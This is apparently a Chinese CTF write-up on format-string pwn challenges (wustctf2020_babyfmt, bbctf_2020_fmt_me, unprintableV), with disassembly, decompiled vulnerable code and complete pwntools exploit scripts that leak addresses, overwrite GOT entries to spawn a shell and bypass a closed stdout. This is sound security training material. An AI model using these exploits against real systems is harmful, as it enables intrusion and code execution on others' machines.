<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public fmt_attack</span><br><span class="line">fmt_attack proc near</span><br><span class="line"></span><br><span class="line">a1= qword ptr -48h # 这个参数就是a1,这里改过名字了</span><br><span class="line">format= byte ptr -40h</span><br><span class="line">var_8= qword ptr -8</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 50h</span><br><span class="line">mov     [rbp+a1], rdi ##</span><br><span class="line">mov     rax, fs:28h</span><br><span class="line">mov     [rbp+var_8], rax</span><br><span class="line">xor     eax, eax</span><br><span class="line">lea     rdx, [rbp+format]</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, 6</span><br><span class="line">mov     rdi, rdx</span><br><span class="line">rep stosq</span><br><span class="line">mov     rax, [rbp+a1] ##</span><br><span class="line">mov     eax, [rax]</span><br><span class="line">test    eax, eax</span><br><span class="line">jle     short loc_EA5</span><br><span class="line"></span><br><span class="line">loc_EA5:</span><br><span class="line">mov     rax, [rbp+a1]</span><br><span class="line">mov     dword ptr [rax], 1  # 这里标记了使用过a1,顺着这个逆回去找a1</span><br><span class="line">lea     rax, [rbp+format]</span><br><span class="line">mov     esi, 28h ; &#x27;(&#x27;</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    read_n</span><br><span class="line">lea     rax, [rbp+format]</span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    printf</span><br><span class="line">nop</span><br><span class="line">mov     rax, [rbp+var_8]</span><br><span class="line">xor     rax, fs:28h</span><br><span class="line">jz      short locret_EE6</span><br></pre></td></tr></table></figure>

<p>getflag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">88</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s2, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;If you can open the door!&quot;</span>);</span><br><span class="line">  read_n(s2, <span class="number">64</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(secret, s2, <span class="number">0x40</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    read(fd, s2, <span class="number">0x50</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(s2);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="close-1"><a href="#close-1" class="headerlink" title="close(1)"></a>close(1)</h4><p>思路</p>
<ul>
<li>这一题给了一个getflag函数,我们可以通过泄露出secret(bss段上)的内容,然后执行orw</li>
<li>fmtattack函数有一个次数限制,用a1来标记,我们可以修改a1然后达到无限次fmt</li>
<li>泄露完secret以后发现还有一个<code>close(1)</code>把标准输出流关了,我们通过修改stdout在bss上指向的libc的位置,改成stderr的位置,让使用标准输出流的时候,用标准错误流输出</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./wustctf2020_babyfmt&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc =ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25987</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./buulibc/libc-2.23-x86.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_offset = <span class="number">0x202060</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> _debug_:    <span class="comment"># 这里是libc版本导致栈不相同,做了分类调整</span></span><br><span class="line">    stack = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;:&quot;</span>)[:-<span class="number">1</span>],<span class="number">10</span>)-<span class="number">0xe0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    stack = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;:&quot;</span>)[:-<span class="number">1</span>],<span class="number">10</span>)-<span class="number">0xe0</span> + <span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;stack =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack)))  <span class="comment"># 这里泄露了栈地址</span></span><br><span class="line">exe_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;:&quot;</span>)[:-<span class="number">1</span>],<span class="number">10</span>) - <span class="number">0xbd5</span></span><br><span class="line">log.success(<span class="string">&#x27;exe_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(exe_base)))  <span class="comment"># 这里泄露了程序基址</span></span><br><span class="line">r3 = <span class="built_in">hex</span>(<span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>],<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(r3)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">bss = exe_base + bss_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2\naaaaaaaaaaaaa&quot;</span>) <span class="comment"># 每次读入的时候会读入0xf个字节,但是后面没有回显,为了不让payload粘在一起,填充了a</span></span><br><span class="line">payload = <span class="string">&quot;%7$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((bss)&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%16$hn&quot;</span> <span class="comment"># 这里修改了栈上的一个代码段地址的末尾两字节改成bss上secret的末尾两字节</span></span><br><span class="line">payload += <span class="string">&quot;%16$p&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># secret所在bss段和code段隔了0x200000,需要改四个字节</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2\naaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%7$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((stack+<span class="number">2</span>)&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%25$hn&quot;</span> <span class="comment"># 修改rbp链</span></span><br><span class="line">payload += <span class="string">&quot;%25$p&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2\naaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%7$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((bss&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%51$hn&quot;</span> <span class="comment"># 修改bss的高位字节</span></span><br><span class="line">payload += <span class="string">&quot;%51$p&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2\naaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%7$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%22$s&quot;</span>    <span class="comment"># 这里泄露出来了secret</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">secret = io.recv(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面在修改stdout指向stderr用来输出flag因为stdout被禁了</span></span><br><span class="line"><span class="comment"># 没有用程序本身的leak函数来泄露,因为只能使用一次,泄露两个字节,所以直接自己手动泄露了</span></span><br><span class="line"></span><br><span class="line">stdout = bss - <span class="number">0x40</span></span><br><span class="line">stderr = stdout + <span class="number">0x20</span> </span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2\naaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%7$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((stderr)&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%16$hn&quot;</span> <span class="comment"># 这里把之前泄露secret的地址重新利用(因为都在bss上,实际上就隔了0x40偏移)</span></span><br><span class="line">io.sendline(payload) <span class="comment"># 先改成stderr,泄露stderr的bss指向的libc地址</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2\naaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%7$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%22$s&quot;</span> <span class="comment"># 这里泄露了stderr的libc地址</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">stderr_libc = u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;stderr_libc =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_libc)))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2\naaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%7$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((stdout)&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%16$hn&quot;</span> <span class="comment"># 把之前bss上srderr的地址改成stdout</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2\naaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%7$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((stderr_libc)&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%22$hn&quot;</span> <span class="comment"># bss上stdout指向的libc地址修改成stderr的,因为两者隔的不远没有超过两字节,所以一次就行</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里已经改完了stdout,现在指向了stderr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;break printf&quot;)</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;3\naaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;door!\n&quot;</span>, secret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用标准错误流输出,得到flag</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>注意点<ol>
<li>一开始输入时间的时候使用的<code>%ld</code>输入字母的话会不会破坏栈,但是还是会输出,动调发现,输出了一个栈上的地址,一个程序代码段的地址,还有一个无用的数,可以泄露出栈地址和程序基址</li>
</ol>
</li>
</ul>
<h3 id="bbctf-2020-fmt-me"><a href="#bbctf-2020-fmt-me" class="headerlink" title="bbctf_2020_fmt_me"></a>bbctf_2020_fmt_me</h3><p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Choose your name&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Lelouch 2. Saitama 3. Eren&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Choice: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( get_int() == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good job. I&#x27;ll give you a gift.&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256uLL</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(other_buf, <span class="number">0x100</span>uLL, buf);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;saitama, the real hero&#x27;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>get_int</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_int</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(s, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> atoi(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路</p>
<ul>
<li>程序很简单，只会有一次fmt然后程序就直接退出（system调用了一个新的进程）</li>
<li>因此我们的首要目标是，再执行一次main</li>
<li>因为无返回，没法通过劫持返回地址，回到mian，同时sprintf后面就只有system，因此只能把system的地址改成main，注意这里还没有调用过system，因该指向system_plt</li>
<li>重新到main函数，我们注意到有两次输入，在get_int里面也会有一个输入10字节,作为atoi的参数,另一个read函数作为sprintf的第三个参数,这里选择第一个输入构造<code>system(&quot;/bin/sh\x00&quot;)</code>,那么还需要把atoi函数改成system函数,这个直接改成system的plt位置,因此不需要泄露libc</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./bbctf_2020_fmt_me&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc =ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26838</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./buulibc/libc-2.27-x64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>) </span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;break main&quot;)</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011a6</span></span><br><span class="line">system_plt = <span class="number">0x401056</span></span><br><span class="line">system_got = elf.got[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((system_plt&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%13$ln&quot;</span> + <span class="string">&quot;aaaaaaa&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((system_plt&amp;<span class="number">0xffff</span>) - <span class="number">0x7</span> - <span class="number">0x40</span>) + <span class="string">&quot;c%12$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((main&amp;<span class="number">0xffff</span>) - (system_plt&amp;<span class="number">0xffff</span>)) + <span class="string">&quot;c%11$hn&quot;</span></span><br><span class="line">payload += p64(system_got)</span><br><span class="line">payload += p64(atoi_got) + p64(atoi_got+<span class="number">2</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;gift.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>payload的顺序是根据已经写入的字符长度来的,atoi改成system_plt(0x401056),system_plt改成main(0x4011a6),system只需要改低两字节(0x11a6),atoi低两字节改成(0x1056),高4字节改成(0x40),这里因为atoi已经调用过了,里面是libc地址,共6个字节,按照大小,先改小的,地址放最后,以免被0截断</li>
<li>注意<strong>这里是向stack上写!</strong>,可以<strong>直接写got,改plt或者libc的</strong>,不要被读到bss的题,找rbp链的思路误导</li>
<li>fmt的构造记得写括号,<strong>注意运算优先级</strong></li>
<li>system函数改返回main函数的时候,因为rsp的问题,一直找不到合适的位置跳转,很多位置直接跳转会报错,我只能一个一个点尝试,最后直接跳在get_int函数刚进去的位置,可以打通</li>
</ul>
<h3 id="unprintableV"><a href="#unprintableV" class="headerlink" title="unprintableV"></a>unprintableV</h3><blockquote>
<p>格式化字符串,爆破,栈迁移,orw</p>
</blockquote>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<ul>
<li>除了canary,保护全开</li>
</ul>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  Sandbox_Loading();</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Sandbox</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>可以看到就禁用了execve,这一题可以用orw</li>
</ul>
<p>menu</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  a = buf;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to d^3CTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is my gift: %p\n&quot;</span>, &amp;a);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;may you enjoy my printf test!&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">strncmp</span>(buf, <span class="string">&quot;d^3CTF&quot;</span>, <span class="number">6uLL</span>) &amp;&amp; time )</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>程序比较简单,但是关闭了标准输出流,解起来很费力</li>
</ul>
